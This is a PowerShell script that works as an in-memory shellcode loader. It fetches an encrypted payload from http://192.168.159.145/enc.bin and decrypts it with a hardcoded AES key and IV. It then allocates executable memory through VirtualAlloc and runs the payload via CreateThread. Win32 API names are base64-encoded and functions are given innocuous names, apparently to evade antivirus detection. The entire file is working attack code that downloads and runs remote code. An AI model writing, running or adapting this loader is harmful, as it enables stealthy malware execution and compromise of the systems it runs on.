function Search-ForFun {
    param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')
    }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $funcBase64 = "R2V0UHJvY0FkZHJlc3M="
    $procAddr = $assem.GetMethods() | Where-Object { $_.Name -eq [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcBase64)) }

    $funcBase64 = "R2V0TW9kdWxlSGFuZGxl"
    $handle = $assem.GetMethod([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcBase64))).Invoke($null, @($moduleName))
    [IntPtr] $result = 0

    try {
        $result = $procAddr[0].Invoke($null, @($handle, $functionName))
    } catch {
        $handleRef = New-Object System.Runtime.InteropServices.HandleRef $null, $handle
        $result = $procAddr[0].Invoke($null, @($handleRef, $functionName))
    }

    return $result
}

function Get-FunType {
    param (
        [Parameter(Position = 0, Mandatory = $true)][Type[]]$func,
        [Parameter(Position = 1)][Type]$retType = [Void]
    )

    $stringo = "UmVmbGVjdGVkRGVsZWdhdGU="
    $stringo2 = "SW5NZW1vcnlNb2R1bGU="

    $assemblyName = New-Object System.Reflection.AssemblyName([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($stringo)))
    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($assemblyName, 'Run')
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($stringo)), $false)

    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $ctor = $typeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    )
    $ctor.SetImplementationFlags('Runtime, Managed')

    $method = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $func)
    $method.SetImplementationFlags('Runtime, Managed')

    return $typeBuilder.CreateType()
}

function Translate-MagicBytes {
    param (
        [byte[]]$CipherText,
        [byte[]]$Key,
        [byte[]]$IV
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $Key
    $aes.IV = $IV

    $translator = $aes.CreateDecryptor()
    $sorted = $translator.TransformFinalBlock($CipherText, 0, $CipherText.Length)
    $aes.Dispose()
    return $sorted
}

function Main {
    $encUrl = "http://192.168.159.145/enc.bin"
    $unsorted = (New-Object Net.WebClient).DownloadData($encUrl)

    $key = [byte[]](0x90,0xAB,0xCD,0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x11,0x22,0x33,0x44,0x55)
    $iv = [byte[]](0xA1,0xB2,0xC3,0xD4,0xE5,0xF6,0x07,0x18,0x29,0x3A,0x4B,0x5C,0x6D,0x7E,0x8F,0x90)
    $sorted = Translate-MagicBytes -CipherText $unsorted -Key $key -IV $iv
    
    $dllBase64 = "a2VybmVsMzIuZGxs" 
    $funcBase64 = "VmlydHVhbEFsbG9j"
    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Search-ForFun ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($dllBase64))) `
                        ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcBase64)))),
        (Get-FunType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    ).Invoke([IntPtr]::Zero, $sorted.Length, 0x3000, 0x40)

    [System.Runtime.InteropServices.Marshal]::Copy($sorted, 0, $lpMem, $sorted.Length)

    $funcBase64 = "Q3JlYXRlVGhyZWFk"
    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Search-ForFun ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($dllBase64))) `
                        ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcBase64)))),
        (Get-FunType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    ).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    $funcBase64 = "V2FpdEZvclNpbmdsZU9iamVjdA=="
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Search-ForFun ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($dllBase64))) `
                        ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcBase64)))),
        (Get-FunType @([IntPtr], [Int32]) ([Int]))
    ).Invoke($hThread, 0xFFFFFFFF)
}

Main
